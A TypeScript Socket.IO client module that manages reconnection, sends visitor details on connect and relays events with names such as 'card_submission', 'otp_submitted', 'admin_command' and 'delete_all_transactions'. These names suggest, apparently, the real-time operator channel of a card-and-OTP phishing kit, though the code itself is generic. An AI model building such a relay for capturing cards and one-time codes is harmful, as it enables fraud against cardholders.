
import io from 'socket.io-client';

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "https" : "http";

// For production, use the same domain as the current window
const socketUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `${window.location.protocol}//${window.location.host}`;

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};
  socket: any;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;
  private isConnecting = false;
  private reconnectTimeout: NodeJS.Timeout | null = null;

  constructor() {
    console.log('[WSClient] Connecting to:', socketUrl);
    this.initSocket();
  }

  private cleanup() {
    if (this.reconnectTimeout) {
      clearTimeout(this.reconnectTimeout);
      this.reconnectTimeout = null;
    }
    
    if (this.socket) {
      this.socket.removeAllListeners();
      if (this.socket.connected) {
        this.socket.disconnect();
      }
    }
  }

  private initSocket() {
    if (this.isConnecting) {
      console.log('[WSClient] Already connecting, skipping...');
      return;
    }
    
    // Clean up any existing socket
    this.cleanup();
    
    this.isConnecting = true;
    
    this.socket = io(socketUrl, { 
      transports: ['polling', 'websocket'],
      timeout: 10000,
      forceNew: true,
      reconnection: false, // We'll handle reconnection manually
      autoConnect: true
    });
    
    this.socket.on('connect', () => {
      console.log('[WSClient] Socket.IO connected with ID:', this.socket.id);
      this.reconnectAttempts = 0;
      this.isConnecting = false;
      this.sendVisitorInfo();
    });

    this.socket.on('disconnect', (reason) => {
      console.log('[WSClient] Socket.IO disconnected, reason:', reason);
      this.isConnecting = false;
      
      // Only attempt reconnection for certain reasons and within limits
      if (reason === 'io server disconnect' && this.reconnectAttempts < this.maxReconnectAttempts) {
        this.scheduleReconnect();
      }
    });

    this.socket.on('connect_error', (error: any) => {
      console.error('[WSClient] Socket.IO connection error:', error);
      this.isConnecting = false;
      this.reconnectAttempts++;
      
      if (this.reconnectAttempts < this.maxReconnectAttempts) {
        console.log(`[WSClient] Will retry connection... Attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}`);
        this.scheduleReconnect();
      } else {
        console.error('[WSClient] Max reconnection attempts reached');
      }
    });

    this.socket.on('connect_timeout', () => {
      console.error('[WSClient] Socket.IO connection timeout');
      this.isConnecting = false;
    });

    this.socket.on('error', (error: any) => {
      console.error('[WSClient] Socket.IO error:', error);
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'enhanced_visitor',
      'start_chat',
      'chat_message',
      'submission_received',
      'submission_error'
    ];

    RELAY_EVENTS.forEach((event) => {
      this.socket.on(event, (payload) => {
        console.log(`[WSClient] Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  private scheduleReconnect() {
    if (this.reconnectTimeout) {
      clearTimeout(this.reconnectTimeout);
    }
    
    const delay = Math.min(2000 * Math.pow(2, this.reconnectAttempts), 30000);
    console.log(`[WSClient] Scheduling reconnect in ${delay}ms`);
    
    this.reconnectTimeout = setTimeout(() => {
      if (!this.socket?.connected) {
        this.initSocket();
      }
    }, delay);
  }

  private sendVisitorInfo() {
    const visitorData = {
      ip: 'Unknown',
      user_agent: navigator.userAgent,
      device_time: new Date().toLocaleString(),
      timestamp: Date.now()
    };
    
    console.log('[WSClient] Sending visitor info:', visitorData);
    this.send('visitor_connected', visitorData);
  }

  send(type: string, payload: any) {
    if (!this.socket?.connected) {
      console.warn('[WSClient] Socket not connected, message dropped:', type);
      return;
    }
    
    console.log(`[WSClient] Sending event: ${type}`, payload);
    this.socket.emit(type, payload);
  }

  connect() {
    if (!this.socket?.connected && !this.isConnecting) {
      console.log('[WSClient] Manual connect requested...');
      this.reconnectAttempts = 0;
      this.initSocket();
    }
  }

  disconnect() {
    console.log('[WSClient] Manual disconnect requested...');
    this.cleanup();
    this.isConnecting = false;
  }

  getSocketId() {
    const id = this.socket?.id;
    console.log('[WSClient] Current socket ID:', id);
    return id;
  }

  isConnected() {
    const connected = this.socket?.connected || false;
    console.log('[WSClient] Connection status:', connected);
    return connected;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
